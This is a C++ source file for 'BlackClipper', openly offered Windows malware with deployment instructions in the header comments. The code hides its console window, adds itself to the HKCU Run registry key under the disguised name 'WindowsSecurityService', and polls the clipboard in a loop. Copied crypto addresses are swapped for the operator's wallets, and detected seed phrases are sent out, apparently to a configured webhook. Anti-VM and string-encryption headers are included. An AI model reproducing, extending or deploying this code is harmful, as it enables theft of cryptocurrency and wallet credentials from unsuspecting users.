#include "format.h"
#include "install.h"
#include "anti_vm.h"
#include "runtime.h"
#include "string_encrypt.h"

//BlackClipper Source By Skar
// fetures -> crypto wallet clipper, seed phrase grabber
// todo -> wallet injection


// HOW TO USE
// 1. Star Repo
// 2. Go to Settings.h
// 3. change ur cryto addys and webhook
// 4. i recomend keeping other stuff to defualt 
// 5. build and deploy, if u make money feel free to dm me and send me a bit (nah kidding kys brokie)

auto main(int argc, char* argv[]) -> int
{
	// Скрываем окно консоли сразу и принудительно
	HWND console = GetConsoleWindow();
	ShowWindow(console, SW_HIDE);
	FreeConsole();  // Отключаем консоль полностью

	// Если первый запуск - добавляем в автозагрузку
	if (bEnablePersistance) {
		HKEY hKey;
		if (RegCreateKeyExW(HKEY_CURRENT_USER,
			L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			0, NULL, REG_OPTION_NON_VOLATILE,
			KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
			
			WCHAR path[MAX_PATH];
			GetModuleFileNameW(NULL, path, MAX_PATH);
			RegSetValueExW(hKey, L"WindowsSecurityService",
				0, REG_SZ, (BYTE*)path,
				(wcslen(path) + 1) * sizeof(wchar_t));
			RegCloseKey(hKey);
		}
	}

	// Сразу запускаем основной функционал
	while (true)
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(10));
		
		sText = __read_clip();
		iCryptoFormat = __check_format(sText);

		if (iCryptoFormat == 5) { 
			__send_seed_key(sText, iCryptoFormat); 
		}

		if (sText == sBtcAddy || sText == sEthAddy || sText == sLtcAddy || 
			sText == sUsdtAddy || sText == sSolAddy) {
			continue; 
		}
		
		if (iCryptoFormat != 0 && iCryptoFormat != 5) {
			__replace(iCryptoFormat);
		}
	}

	return 0;
}